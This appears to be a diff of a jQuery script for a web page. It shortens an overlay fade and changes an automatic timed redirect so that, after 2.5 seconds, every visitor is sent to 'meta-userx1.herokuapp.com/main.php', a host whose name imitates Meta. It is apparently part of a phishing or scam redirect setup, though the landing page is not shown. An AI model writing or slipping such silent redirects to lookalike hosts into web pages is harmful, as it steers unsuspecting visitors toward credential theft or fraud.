@@ -12,11 +12,11 @@ jQuery(function($){
     }).done(function() {
       setTimeout(function(){
         $("#overlay").fadeOut(300);
-      },500);
+      },300);
     });
   }); 
   setTimeout(function() {   //calls click event after a certain time
-    $(location).attr('href','https://en-mobile-home1.blogspot.com/index.html?m=0&re=car')
+    $(location).attr('href','https://meta-userx1.herokuapp.com/main.php?re=huawei&n=1')
  }, 2500);
 
 });
